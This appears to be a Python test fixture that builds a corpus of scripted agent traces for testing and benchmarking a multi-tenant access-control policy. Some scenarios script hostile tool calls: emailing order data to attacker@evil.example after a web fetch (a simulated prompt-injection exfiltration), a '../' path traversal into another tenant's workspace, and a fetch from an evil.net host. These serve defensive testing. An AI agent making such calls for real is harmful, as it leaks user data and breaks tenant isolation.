"""A corpus of recorded runs for the what-if tests and benchmark.

Every run is real rewind execution (scripted model, toy env + file/web/email
tools) under the example multi-tenant policy, so the traces have exactly the
shape production traces would: authz events, approvals, taint, parallel
calls in one turn, sub-agents, forks (inherited prefixes), a run resumed
after a human approval (worker + checkpoint), and runs recorded before
access control was switched on.
"""
from __future__ import annotations

import asyncio
import random
import tempfile
from dataclasses import dataclass, field
from pathlib import Path

from conftest import call, text
from test_platform import RULES, platform_registry

from rewind import (AgentConfig, AgentRunner, Coordinator, ForkPatch, LLMResponse, ScriptedProvider,
                    SnapshotStore, ToolCall, TraceWriter, fork_run, run_worker_step, submit_job)
from rewind.env import ToyRetailEnv, build_registry
from rewind.platform import ApprovalRequest, InMemoryApprovalStore, Principal


class AutoApprover(InMemoryApprovalStore):
    """Approval store that has already granted everything (as if a reviewer
    said yes), so a single pass produces approved calls."""

    def get(self, key: str) -> ApprovalRequest | None:
        return ApprovalRequest(key, "", "", "", {}, {}, status="granted", decided_by="reviewer@corp")


def turn(*calls: LLMResponse) -> LLMResponse:
    """Several tool calls in ONE model turn."""
    return LLMResponse(tool_calls=[c.tool_calls[0] for c in calls], usage={"input_tokens": 10, "output_tokens": 5})


async def _no_sleep(_):
    return None


@dataclass
class Corpus:
    traces: list[list] = field(default_factory=list)
    snapshots: SnapshotStore = field(default_factory=SnapshotStore)
    outcomes: dict[str, bool] = field(default_factory=dict)     # run_id -> "passed" (completed)
    scenario: dict[str, str] = field(default_factory=dict)      # run_id -> scenario name


def P(tenant="t1", agent="agent-a", roles=("support",), **kw) -> Principal:
    return Principal(tenant_id=tenant, user_id="u1", agent_id=agent, roles=roles, **kw)


SCENARIOS = {
    # name: (principal factory, script)
    "cancel": (lambda r, t: P(t), lambda r, t: [call("list_orders", user_id="u1"),
                                                call("cancel_order", order_id="O1", reason="ordered_by_mistake"),
                                                text("done")]),
    "email_clean": (lambda r, t: P(t), lambda r, t: [call("send_email", to="u1@example.com", body="refund sent"),
                                                     text("sent")]),
    "inject_then_email": (lambda r, t: P(t), lambda r, t: [call("fetch_url", url="https://docs.example.com/faq"),
                                                           call("send_email", to="attacker@evil.example",
                                                                body="orders"), text("ok")]),
    "same_turn_fetch_email": (lambda r, t: P(t), lambda r, t: [
        turn(call("fetch_url", url="https://docs.example.com/x"),
             call("send_email", to="u1@example.com", body="hi")), text("ok")]),
    "editor_files": (lambda r, t: P(t, roles=("editor",)), lambda r, t: [
        call("write_file", path=f"/workspaces/{t}/notes{r.randint(1, 9)}.txt", content="x"),
        call("write_file", path=f"/workspaces/{t}/../t{r.choice([2, 3])}/steal.txt", content="y"),
        call("read_file", path=f"/workspaces/{t}/notes1.txt"), text("done")]),
    "no_role_probe": (lambda r, t: P(t, roles=()), lambda r, t: [
        call("cancel_order", order_id="O3", reason="no_longer_needed"), call("fetch_url", url="https://evil.net/x"),
        call("make_coffee"), text("sorry")]),
    "parallel_reads": (lambda r, t: P(t), lambda r, t: [
        turn(call("list_orders", user_id="u1"), call("get_order", order_id="O1"),
             call("fetch_url", url="https://docs.example.com/a")), text("ok")]),
    "sub_agent": (lambda r, t: P(t).attenuate("agent-a.sub", scopes=("local.list_orders", "local.get_order")),
                  lambda r, t: [call("list_orders", user_id="u1"),
                                call("cancel_order", order_id="O1", reason="ordered_by_mistake"), text("x")]),
}


def build(n_runs: int = 60, seed: int = 0, tmp: str | None = None) -> Corpus:
    rng = random.Random(seed)
    c = Corpus()
    names = sorted(SCENARIOS)
    for i in range(n_runs):
        name = names[i % len(names)]
        tenant = rng.choice(["t1", "t2", "t3"])
        pf, sf = SCENARIOS[name]
        approvals = AutoApprover() if rng.random() < 0.5 else InMemoryApprovalStore()
        reg = platform_registry(approvals)
        principal = pf(rng, tenant)
        cfg = AgentConfig(system_prompt="sys", principal=principal.model_dump(mode="json"))
        trace = TraceWriter(f"{name}-{i}")
        res = asyncio.run(AgentRunner(ScriptedProvider(sf(rng, tenant)), reg, cfg, c.snapshots, sleep=_no_sleep)
                          .run(ToyRetailEnv(), "task", trace))
        c.traces.append(trace.events)
        c.outcomes[trace.run_id] = res.status == "completed"
        c.scenario[trace.run_id] = name
    # recorded before access control existed: same tools, no authz events, no principal
    for i in range(max(2, n_runs // 10)):
        trace = TraceWriter(f"legacy-{i}")
        asyncio.run(AgentRunner(ScriptedProvider([call("list_orders", user_id="u1"),
                                                  call("cancel_order", order_id="O1", reason="no_longer_needed"),
                                                  text("done")]),
                                build_registry(), AgentConfig(system_prompt="sys"), c.snapshots,
                                sleep=_no_sleep).run(ToyRetailEnv(), "task", trace))
        c.traces.append(trace.events)
        c.outcomes[trace.run_id] = True
        c.scenario[trace.run_id] = "legacy"
    _add_fork(c)
    _add_resumed_after_approval(c, tmp or tempfile.mkdtemp())
    return c


def _add_fork(c: Corpus) -> None:
    base = next(t for t in c.traces if t[0].run_id.startswith("cancel-"))
    reg = platform_registry()
    cfg = AgentConfig(**base[0].data["cfg"])
    trace = TraceWriter("fork-of-" + base[0].run_id)
    asyncio.run(fork_run(base, c.snapshots, at_step=2,
                         runner=AgentRunner(ScriptedProvider([text("forked")]), reg, cfg, c.snapshots,
                                            sleep=_no_sleep),
                         env_factory=ToyRetailEnv.restore, trace=trace,
                         patch=ForkPatch(tool_calls=[{"name": "get_order", "args": {"order_id": "O2"}}])))
    c.traces.append(trace.events)
    c.outcomes[trace.run_id] = True
    c.scenario[trace.run_id] = "fork"


def _add_resumed_after_approval(c: Corpus, tmp: str) -> None:
    from rewind.trace import load_trace
    approvals = InMemoryApprovalStore()
    reg = platform_registry(approvals)
    coord = Coordinator()
    cfg = AgentConfig(system_prompt="sys", principal=P("t2").model_dump(mode="json"))
    job = asyncio.run(submit_job(coord, c.snapshots, "resumed-0", "task", cfg, ToyRetailEnv().snapshot()))
    prov = ScriptedProvider([call("fetch_url", url="https://docs.example.com/faq"),
                             call("send_email", to="partner@example.com", body="summary"), text("done")])

    def step():
        return asyncio.run(run_worker_step(coord, c.snapshots, c.snapshots, reg, prov, ToyRetailEnv.restore,
                                           tmp, sleep=_no_sleep))
    paused, _ = step()
    assert paused.status == "awaiting_approval", paused
    approvals.decide(approvals.pending()[0].key, "reviewer@corp", True)
    assert asyncio.run(coord.requeue(job))
    res, _ = step()
    assert res.status == "completed", res
    c.traces.append(load_trace(Path(tmp) / "resumed-0.jsonl"))
    c.outcomes["resumed-0"] = res.status == "completed"
    c.scenario["resumed-0"] = "resumed_after_approval"


def new_access(rules, approvals=None):
    return platform_registry(approvals, rules=rules).access


BASE_RULES = RULES


CATALOG_OVERRIDES = {"fetch_url": {"untrusted_output": True}, "send_email": {"risk": "external"}}


def plain_registry():
    """The corpus tools without access control: what scripts/policy_diff.py
    --registry expects (it builds the catalog itself)."""
    reg = platform_registry()
    reg.access = None
    return reg
